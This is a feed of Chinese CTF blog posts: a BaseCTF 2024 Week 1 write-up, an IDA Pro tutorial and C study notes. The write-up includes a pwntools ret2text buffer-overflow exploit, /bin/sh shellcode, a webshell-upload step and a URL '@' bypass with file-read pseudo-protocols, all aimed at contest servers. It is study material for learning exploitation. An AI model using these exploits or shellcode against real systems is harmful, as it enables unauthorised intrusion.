data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_3.png" alt="alt text"></p><h2 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a><strong>[Week1] A Dark Room</strong></h2><p>我也玩过<br>flag在注释里<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_4.png" alt="alt text"></p><h2 id="Week1-upload"><a href="#Week1-upload" class="headerlink" title="[Week1] upload"></a>[Week1] upload</h2><p>直接传马上去就行了<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_5_1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_5_2.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_5_3.png" alt="text"></p><h2 id="Week1-Aura-酱的礼物"><a href="#Week1-Aura-酱的礼物" class="headerlink" title="[Week1] Aura 酱的礼物"></a>[Week1] Aura 酱的礼物</h2><p>pen检查用伪协议data%3A%2F%2Ftext%2Fplain%3Bbase64%2CQXVyYQ%3D%3D过<br>challenge难点</p><ol><li>需要以<a href="http://jasmineaura.github.io开头/">http://jasmineaura.github.io开头</a></li><li>需要让访问到的内容包含已经收到Kengwang的礼物啦</li></ol><p>而这个网页指向的博客,在题目开始的时候,有一篇文章却是包含了已经收到Kengwang的礼物啦<br>但后来被删了,我没来得及蹭到<br>所以通过url的奇妙结构<br><a href="http://jasmineaura.github.io@truthleader.github.io/">http://jasmineaura.github.io@truthleader.github.io</a></p><p>@后面的才会被当作域名解析<br>然后用gift直接包含得不到flag,所以用任意文件读取的伪协议<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_6_1.png" alt="alt text"> </p><p>base64解密<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/web_6_2.png" alt="alt text"></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Week1-签个到吧"><a href="#Week1-签个到吧" class="headerlink" title="[Week1] 签个到吧"></a><strong>[Week1] 签个到吧</strong></h2><p>nc challenge.basectf.fun 32200<br>cat /flag直接有</p><p><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_qiandao.png"></p><h2 id="Week1-echo"><a href="#Week1-echo" class="headerlink" title="[Week1] echo"></a><strong>[Week1] echo</strong></h2><p>用echo打印flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_echo.png"></p><h2 id="Week1-Ret2text"><a href="#Week1-Ret2text" class="headerlink" title="[Week1] Ret2text"></a><strong>[Week1] Ret2text</strong></h2><p>可以看到shell的地址<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_ret2text1.png" alt="alt text"><br>而字符串大小为32<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_ret2text2.png" alt="alt text"></p><p>也就是32+8位数据填充实现栈溢出,然后用shell地址覆盖ret地址<br>exp如下</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *context.log_level='debug'sh = remote('challenge.basectf.fun',31868)payload=b'0'*(32+8)+p64(0x4011BB)sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-shellcode-level0"><a href="#Week1-shellcode-level0" class="headerlink" title="[Week1] shellcode_level0"></a>[Week1] shellcode_level0</h2><p>用pwntools喵喵工具生成shellcode,直接出<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_shellcode1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_shellcode2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_shellcode3.png" alt="alt text"> </p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *context.log_level='debug'sh = process('./shellcode_level0')elf = ELF('./shellcode_level0')payload=b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'sh.sendline(payload)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-我把她丢了"><a href="#Week1-我把她丢了" class="headerlink" title="[Week1] 我把她丢了"></a>[Week1] 我把她丢了</h2><p>栈溢出的残缺后门+nx保护<br>不太懂,上网照喵画虎弄出来的<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_wbtdl1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/pwn_wbtdl2.png" alt="alt text"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Week1-You-are-good-at-IDA"><a href="#Week1-You-are-good-at-IDA" class="headerlink" title="[Week1] You are good at IDA"></a><strong>[Week1] You are good at IDA</strong></h2><p>ida拖进去看的三个函数,有flag的三部分,拼起来就好了<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_ezida3.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_ezida1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_ezida2.png" alt="text"></p><h2 id="Week1-UPX-mini"><a href="#Week1-UPX-mini" class="headerlink" title="[Week1] UPX mini"></a><strong>[Week1] UPX mini</strong></h2><p>用upx妙妙工具解壳,<br>然后就看到了base秘文<br>用cyberchef妙妙工具得flag<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_upx1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_upx2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_upx3.png" alt="alt text"></p><h2 id="Week1-ez-maze"><a href="#Week1-ez-maze" class="headerlink" title="[Week1] ez_maze"></a>[Week1] ez_maze</h2><p>迷宫题<br>找到了地图和长宽数据<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_maze1.png" alt="text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_maze2.png" alt="text"> </p><pre class="line-numbers language-none"><code class="language-none">x$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$$$$$$$$$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$$$$$$&amp;$$&amp;$$$$$$$$$$$&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&amp;是路,$是墙,用最短路线走到y<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/reverse_maze3.png" alt="alt text"><br>然后转md5就是flag了</p><h2 id="Week1-Ez-Xor"><a href="#Week1-Ez-Xor" class="headerlink" title="[Week1] Ez Xor"></a>[Week1] Ez Xor</h2><p>用ida看到如下内容<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor3.png" alt="alt text"> </p><p>这段程序通过keystream函数生成了长度为28的key<br>然后通过encrypt函数对用户的输入进行xor运算<br>然后通过checkflag函数将加密后的用户输入和str比较</p><p>由于</p><ol><li>key是固定生成的</li><li>xor的逆运算是再xor一遍<br>所以能够用c将keystream 和 encrypt实现<br>将str作为输入<br>就能得到flag了</li></ol><p>str如下<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_ezxor4.png" alt="alt text"> </p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;void decrypt(int *v14,int *str,int v17){    for (int i=0;i&lt;v17;i++){        printf("%d", str[i]);        str[i]=str[i]^v14[v17-i-1];        printf("%d %d\n",str[i], v14[v17-i-1]);        // printf("%d",str[i]);    }    return ;}void KeyStream(int *v4,int *v14,int a3){    for (int i=0;i&lt;a3;i++){        v14[i]=i^v4[i%3];        // printf("%c",v14[i]);    }    return;}int main(){    int v4[3]={'X','o','r'};    int v14[28]={88,110,112,91,107,119,94,104,122,81,101,121,84,98,124,87,127,99,74,124,102,77,121,101,64,118,104,67};    // int v14[28];    int v5[28];    int str[28]={1,9,5,'%','&amp;','-',0x0B,0x1D,'$','z','1',' ',0x1E,'I','=','g','M','P',8,'%','.','n',5,'4','\"','@',';','%'};    KeyStream(&amp;v4,v14,28);    decrypt(v14,str,28);    // for(int i=0;i&lt;28;i++){    //     printf("%d,", v14[i]);    // }    for(int i=0;i&lt;28;i++){        printf("%c", str[i]);    }    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Week1-BasePlus"><a href="#Week1-BasePlus" class="headerlink" title="[Week1] BasePlus"></a>[Week1] BasePlus</h2><p>伪代码如下<br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_base1.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_base2.png" alt="alt text"><br><img data-src="/2024/08/16/BaseCTF%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B2024/re_base3.png" alt="alt text"></p><p>其加密逻辑大致是</p><ol><li>将用户的输入以3个字符为单位分组,不足的用0作为填充</li><li>加载每个分组,通过<em>二进制运算</em>得到下标,通过secret字典产生4个密文</li><li>最终的密文长度,就是分组数*4</li></ol><p>程序提供了加密后的flag<br>我们可以通过flag的每4个字符,和secret字典比对得到每4个下标</p><p>这4个下标来自于明文的每3个字符</p><pre class="line-numbers language-none"><code class="language-none">// 一个字符有8bit(unsigned __int8)v15 &gt;&gt; 2 // 第一个字符的前6个bit(HIBYTE(v15) &gt;&gt; 4) | (16 * v15) &amp; 0x30 // 第二个字符的前4bit和第一个字符的后2bit(v16 &gt;&gt; 6) | (4 * HIBYTE(v15)) &amp; 0x3C // 第三个字符的前2个bit和第二哥字符的后4bitv16 &amp; 0x3F // 第三个字符的后6bit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总之,我们只要把所有的bit拼回去,就能得到flag</p><p>exp如下</p><pre class="line-numbers language-none"><code class="language-none">flag = "lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!"secret="/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC"flag = list(flag)for i in range(len(flag)):    flag[i] = ord(flag[i]) ^ 0xEfor i in range(0, len(flag),4):    a1=secret.index(chr(flag[i])) # v15 前6位 为00111111    a2=secret.index(chr(flag[i+1])) # v16的前4位和v15后2位为00001111和00110000    a3=secret.index(chr(flag[i+2])) # v16的后4位和v17的前2位00111100 00000011    a4=secret.index(chr(flag[i+3])) # v17的后6位00111111    v15_1 = (a2 &amp; 0b00110000)&gt;&gt;4    v15_2 = a1&lt;&lt; 2    v15 = v15_1 | v15_2    v16_1 = (a2 &amp; 0b00001111) &lt;&lt; 4    v16_2 = (a3&amp;0b00111100) &gt;&gt; 2    v16=v16_1|v16_2    v17_1=(a3&amp;0b00000011)&lt;&lt;6    v17_2=(a4 &amp; 0b00111111)    v17=v17_1|v17_2    print(chr(v15),end='')    print(chr(v16),end= '')    print(chr(v17),end= '')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾/引用"></a>结尾/引用</h2><hr><blockquote><p>We are just another visitor in a transient world.</p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;已经收到Kengwang的礼物啦&lt;br&gt;&lt;del&gt;鉴于某些不可明说的原因 第二周开始就放官方writeup 并作为自主练习 不主动参赛了&lt;/del&gt;&lt;br&gt;目前更新到了第一周的writeup&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://www.maonie.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>逆逆逆逆逆向-CTF之reverse</title>
    <link href="https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/"/>
    <id>https://www.maonie.top/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/</id>
    <published>2024-08-05T04:10:49.000Z</published>
    <updated>2024-08-14T16:19:16.800Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类"><a href="#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类" class="headerlink" title="既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类"></a>既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类</h1><p>关键基本都在ida pro的使用<br>以及反编程后的信息搜集</p><pre class="line-numbers language-none"><code class="language-none">~目前来说有用的记录~shift+f12 查看字符串 ctrl+X 查询该字符串对应内存的相关调用f5 查看伪c代码代码中的变量直接选中后双击就可查看具体内容alt+Tida pro的环境目录内最好是纯英文 不然会出各种各样的bug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="测试题-BUUCTF-easyre1"><a href="#测试题-BUUCTF-easyre1" class="headerlink" title="测试题 BUUCTF-easyre1"></a>测试题 BUUCTF-easyre1</h2><span id="more"></span><p>将题目提供的exe以ida pro打开<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/1.jpg" alt="1"><br>ida pro会自动判断我们提供软件的类型并提供选择 这里直接点击ok<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/2.jpg" alt="2"><br>软件内有很多不同的视窗 我们来主要分析他生成的视窗化代码<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/3.jpg" alt="3"><br>很明显这段就是flag 输入后便能完成题目<br>目前先更到这里 后面主要讲解ida pro 的各项功能和视窗的不同 然后再来两个例题</p><h2 id="至于ida相关的介绍"><a href="#至于ida相关的介绍" class="headerlink" title="至于ida相关的介绍"></a>至于ida相关的介绍</h2><blockquote><p>主页面<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/4.jpg" alt="4"></p></blockquote><blockquote><p>函数窗口<br>可以使用 <code>ctrl+f</code> 搜索指定名称的函数<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/5.jpg" alt="5"></p></blockquote><blockquote><p>数据窗口<br>分为 <strong>视图</strong> 和 <strong>文字</strong> 两种显示方式 可以按空格来切换 文字视窗展示了一些汇编代码和地址<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/6.jpg" alt="6"><br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/7.jpg" alt="7"></p></blockquote><blockquote><p>伪代码模式（F5）<br>在汇编窗口文本模式中对着函数点F5即可弹出伪代码窗口。其是将汇编语言变成伪代码，方便阅读。<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/8.jpg" alt="8"></p></blockquote><blockquote><p>十六进制窗口<br>默认情况下，十六进制窗口显示程序内容和列表的标准十六进制代码，每行显示16个字节，以及其对应的ASCII字符。和在反汇编窗口中一样，用户也可以同时打开几个十六进制窗口<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/9.jpg" alt="9"></p></blockquote><blockquote><p>消息窗口<br>显示IDA输出的信息，用户可以通过输出信息找到文件分析有关的状态信息和操作导致的错误信息，这个窗口类似于Pycharm等软件的Console控制台。<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/10.jpg" alt="10"></p></blockquote><blockquote><p>导航栏：<br>彩色的水平带是 IDA 的概况导航栏，也叫做导航带。导航带是被加载文件地址空间的线性视图。默认情况下，它会呈现二进制文件的整个地址范围。你可以右击导航带内任何位置。在导航带上，会有一个细小的当前位置指示符（默认为黄色）指向与当前反汇编窗口中显示的地址范围对应的导航带地址。将光标悬停在导航带的任何位置，IDA 会显示一个提示，指出其在二进制文件中的对应位置。<br>简单来说，点到哪里跳到哪里，而不同的颜色代表了不同的数据段，比如说data段，text段等<br><img data-src="/2024/08/05/%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E9%80%86%E5%90%91-CTF%E4%B9%8Breverse/11.jpg" alt="11"></p></blockquote><blockquote><p>参考:<a href="https://blog.csdn.net/qq_52642385/article/details/135620222">https://blog.csdn.net/qq_52642385/article/details/135620222</a></p></blockquote></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot;&gt;&lt;a href=&quot;#既然把cs50的c语言翻了个底-我们来学习反编译-然后引导到CTF的reverse大类&quot; class=&quot;headerlink&quot; title=&quot;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&quot;&gt;&lt;/a&gt;既然把cs50的c语言翻了个底 我们来学习反编译 然后引导到CTF的reverse大类&lt;/h1&gt;&lt;p&gt;关键基本都在ida pro的使用&lt;br&gt;以及反编程后的信息搜集&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;~目前来说有用的记录~
shift+f12 查看字符串 
ctrl+X 查询该字符串对应内存的相关调用
f5 查看伪c代码
代码中的变量直接选中后双击就可查看具体内容
alt+T

ida pro的环境目录内最好是纯英文 不然会出各种各样的bug&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;测试题-BUUCTF-easyre1&quot;&gt;&lt;a href=&quot;#测试题-BUUCTF-easyre1&quot; class=&quot;headerlink&quot; title=&quot;测试题 BUUCTF-easyre1&quot;&gt;&lt;/a&gt;测试题 BUUCTF-easyre1&lt;/h2&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>求解</title>
    <link href="https://www.maonie.top/2024/07/14/%E6%B1%82%E8%A7%A3/"/>
    <id>https://www.maonie.top/2024/07/14/%E6%B1%82%E8%A7%A3/</id>
    <published>2024-07-14T05:35:44.000Z</published>
    <updated>2024-08-02T06:25:54.897Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="这里记录一下暑假两个月自学的笔记"><a href="#这里记录一下暑假两个月自学的笔记" class="headerlink" title="这里记录一下暑假两个月自学的笔记"></a>这里记录一下暑假两个月自学的笔记</h1><p>汇编语言-给电脑看的语言 虽然也是要被转化为0与1的 但层次更为粗糙 可读性更低<br>vscode的debugger<br>make clang debug50等用法</p><span id="more"></span><h4 id="声明数组"><a href="#声明数组" class="headerlink" title="声明数组"></a>声明数组</h4><p>int 数组名[数组大小]<br>数组名[从零开始的数组序号] = 变量名</p><pre class="line-numbers language-none"><code class="language-none">例int scores[3];scores[0] = 72;scores[1] = 77;scores[2] = 98;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以通过get_int函数达到获取int数值的作用</p><p>const是常量 定义之后无法再更改<br>例<br><code>const int n =3</code></p><p>数据在处理的时候会占用内存<br>而每段数据为了表明字符串已结束会多加一个字节<br>例： 3个字符 将占用3+1个字节</p><p>string 字符串 由char（字符） 组成<img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/image.png" alt="image"></p><p>大写和小写字母在acsii码中正好差32<br>小写转大写减去32即可<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/12.png" alt="12"></p><p>比较string用的是strcmp（string1，string2）<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/22.png" alt="22"><br>linear search 线性<br>binary search 二分<br>还有排序相关的<br>选择排序算法<br>一次一次选最小的元素 放到最左边</p><p>冒泡排序算法<br>抓出来一个和别的依次比较<br>假如大就往右移（互换位置）<br>然后依次解决</p><p>选择排序的次数是n（n-1）/2 (已编辑)<br>数量大概是n的平方</p><p>冒泡排序的次数为（n-1）（n-1）<br>这俩的上限其实都差不多<br>这俩的上界都是n方<br>下界是<br>冒泡排序在数据已经接近或已经有序的情况下<br>更有优势吧<br>感觉这俩更像是两个顺序不同的排序<br>选择排序主要是从左到右筛选<br>冒泡排序主要是从右到左</p><p>然后是在函数里套函数的情况<br>void draw(int n)<br>{}<br><img data-src="/2024/07/14/%E6%B1%82%E8%A7%A3/31.png" alt="31"><br>归并排序<br>把数据拆成两半<br>并分别排好顺序<br>例<br>0136 2457<br>然后先看两边的第一个<br>0<br>排前面<br>现在揭露0右边的1<br>再把1和2比较<br>以此类推<br>归并会将这些数据先拆成两个两个<br>二个排序→四个排序→八个排序<br>以此类推<br>有更好的效率</p><p>%p 输出地址<br>变量名前面要加上&amp;<br>上面这个是在printf中的用法<br>定义时使用<code>*p</code> 表明p是一个指针</p><p>静态数组：静态定义的数组在程序加载的时候就已经分配了内存空间，直到函数结束或者程序结束后才会被释放；%20动态数组：由malloc()或new()等函数定义的数组，在程序运行时才申请内存空间，使用完后可以借助free()或delete()手动释放。</p><p>以scanf来获取数据</p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;这里记录一下暑假两个月自学的笔记&quot;&gt;&lt;a href=&quot;#这里记录一下暑假两个月自学的笔记&quot; class=&quot;headerlink&quot; title=&quot;这里记录一下暑假两个月自学的笔记&quot;&gt;&lt;/a&gt;这里记录一下暑假两个月自学的笔记&lt;/h1&gt;&lt;p&gt;汇编语言-给电脑看的语言 虽然也是要被转化为0与1的 但层次更为粗糙 可读性更低&lt;br&gt;vscode的debugger&lt;br&gt;make clang debug50等用法&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>夺旗时间</title>
    <link href="https://www.maonie.top/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/"/>
    <id>https://www.maonie.top/2024/06/08/%E5%A4%BA%E6%97%97%E6%97%B6%E9%97%B4/</id>
    <published>2024-06-08T05:22:16.000Z</published>
    <updated>2024-06-12T06:26:07.323Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>三个月的假期准确来说还没到 在这之前 预热一下CTF的学习</p><h2 id="CTF题目类别"><a href="#CTF题目类别" class="headerlink" title="CTF题目类别"></a>CTF题目类别</h2><p>-Reverse<br>-题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。<br>-所需知识：汇编语言、加密与解密、常见反编译工具</p><p>-Pwn<br>-Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。<br>-所需知识：C，OD+IDA，数据结构，操作系统</p><p>-Web<br>-Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 